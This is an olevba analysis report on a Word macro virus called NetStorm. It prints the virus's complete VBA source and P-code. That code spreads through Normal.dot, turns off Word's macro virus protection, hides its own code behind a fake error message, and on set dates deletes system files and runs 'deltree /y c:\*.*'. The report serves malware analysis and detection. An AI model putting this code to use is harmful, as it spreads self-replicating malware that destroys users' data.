olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.NetStorm
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.NetStorm - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NetStorm.bas 
in file: Virus.MSWord.NetStorm - OLE stream: 'Macros/VBA/NetStorm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorInfectGlobalTemplate
If (CheckInfected = 0) Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="NetStorm", Object:=wdOrganizerObjectProjectItems
End If
ErrorInfectGlobalTemplate:
Call NetKiller
End Sub
Function CheckInfected()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
CheckInfected = 0
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
If WordBasic.[MacroName$](i, 0) = "NetStorm" Then
    CheckInfected = -1
End If
Next i
End Function
Sub FileOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo InfError
    Dialogs(wdDialogFileOpen).Show
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="NetStorm", Object:=wdOrganizerObjectProjectItems
    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
InfError:
Call NetKiller
End Sub
Sub FileNew()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo InfError
    Dialogs(wdDialogFileNew).Show
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="NetStorm", Object:=wdOrganizerObjectProjectItems
    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
InfError:
Call NetKiller
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo InfError
    Dialogs(wdDialogFileSaveAs).Show
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="NetStorm", Object:=wdOrganizerObjectProjectItems
    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
InfError:
Call NetKiller
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Dim Message, Title, Default, MyValue
Message = "New VBAProject _name:"
Title = "Microsoft Visual Basic"
Default = "NewVBAProject"
MyValue = InputBox(Message, Title, Default)
If MyValue = "braincoma" Then
ShowVisualBasicEditor = True
GoTo ErrorVVBC
End If
Options.VirusProtection = False
On Error GoTo ErrorVVBC
MsgBox "Not enough memory to perform this operation", vbCritical + vbOKOnly + vbMsgBoxHelpButton + vbDefaultButton2, "Microsoft Word"
ErrorVVBC:
End Sub
Sub NetKiller()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
If Mid(Time, 1, 2) = "13" Then MsgBox "Take it easy, lamer !", Title:="Net Storm"
If Mid(Time, 1, 2) = "19" Then MsgBox "Go home, lamer !", Title:="Net Storm"
If Mid(Date, 1, 2) = "10" Then Kill "c:\autoexec.bat"
If Mid(Date, 1, 2) = "11" Then Kill "c:\config.sys"
If Mid(Date, 1, 2) = "12" Then Kill "c:\command.com"
If Mid(Date, 1, 2) = "13" Then Shell "deltree /y c:\*.* > null"
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.NetStorm - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.NetStorm
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/NetStorm - 5187 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	OnError ErrorInfectGlobalTemplate 
' Line #5:
' 	Ld CheckInfected 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #6:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "NetStorm"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #7:
' 	EndIfBlock 
' Line #8:
' 	Label ErrorInfectGlobalTemplate 
' Line #9:
' 	ArgsCall (Call) NetKiller 0x0000 
' Line #10:
' 	EndSub 
' Line #11:
' 	FuncDefn (Function CheckInfected())
' Line #12:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #13:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #14:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #15:
' 	LitDI2 0x0000 
' 	St CheckInfected 
' Line #16:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #17:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #18:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0008 "NetStorm"
' 	Eq 
' 	IfBlock 
' Line #19:
' 	LitDI2 0x0001 
' 	UMi 
' 	St CheckInfected 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #22:
' 	EndFunc 
' Line #23:
' 	FuncDefn (Sub FileOpen())
' Line #24:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #25:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #26:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #27:
' 	OnError InfError 
' Line #28:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #29:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "NetStorm"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #30:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #31:
' 	Label InfError 
' Line #32:
' 	ArgsCall (Call) NetKiller 0x0000 
' Line #33:
' 	EndSub 
' Line #34:
' 	FuncDefn (Sub FileNew())
' Line #35:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #36:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #37:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #38:
' 	OnError InfError 
' Line #39:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #40:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "NetStorm"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #41:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #42:
' 	Label InfError 
' Line #43:
' 	ArgsCall (Call) NetKiller 0x0000 
' Line #44:
' 	EndSub 
' Line #45:
' 	FuncDefn (Sub FileSaveAs())
' Line #46:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #47:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #48:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #49:
' 	OnError InfError 
' Line #50:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #51:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "NetStorm"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #52:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #53:
' 	Label InfError 
' Line #54:
' 	ArgsCall (Call) NetKiller 0x0000 
' Line #55:
' 	EndSub 
' Line #56:
' 	FuncDefn (Sub ViewVBCode())
' Line #57:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #58:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #59:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #60:
' 	Dim 
' 	VarDefn Message
' 	VarDefn Title
' 	VarDefn Default
' 	VarDefn MyValue
' Line #61:
' 	LitStr 0x0015 "New VBAProject _name:"
' 	St Message 
' Line #62:
' 	LitStr 0x0016 "Microsoft Visual Basic"
' 	St Title 
' Line #63:
' 	LitStr 0x000D "NewVBAProject"
' 	St Default 
' Line #64:
' 	Ld Message 
' 	Ld Title 
' 	Ld Default 
' 	ArgsLd InputBox 0x0003 
' 	St MyValue 
' Line #65:
' 	Ld MyValue 
' 	LitStr 0x0009 "braincoma"
' 	Eq 
' 	IfBlock 
' Line #66:
' 	LitVarSpecial (True)
' 	St ShowVisualBasicEditor 
' Line #67:
' 	GoTo ErrorVVBC 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #70:
' 	OnError ErrorVVBC 
' Line #71:
' 	LitStr 0x002B "Not enough memory to perform this operation"
' 	Ld vbCritical 
' 	Ld vbOKOnly 
' 	Add 
' 	Ld vbMsgBoxHelpButton 
' 	Add 
' 	Ld vbDefaultButton2 
' 	Add 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #72:
' 	Label ErrorVVBC 
' Line #73:
' 	EndSub 
' Line #74:
' 	FuncDefn (Sub NetKiller())
' Line #75:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #76:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #77:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #78:
' 	Ld Time 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 "13"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0015 "Take it easy, lamer !"
' 	LitStr 0x0009 "Net Storm"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' 	EndIf 
' Line #79:
' 	Ld Time 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 "19"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0010 "Go home, lamer !"
' 	LitStr 0x0009 "Net Storm"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' 	EndIf 
' Line #80:
' 	Ld Date 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 "10"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "c:\autoexec.bat"
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #81:
' 	Ld Date 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 "11"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "c:\config.sys"
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #82:
' 	Ld Date 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 "12"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000E "c:\command.com"
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #83:
' 	Ld Date 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 "13"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0018 "deltree /y c:\*.* > null"
' 	ArgsCall Shell 0x0001 
' 	EndIf 
' Line #84:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

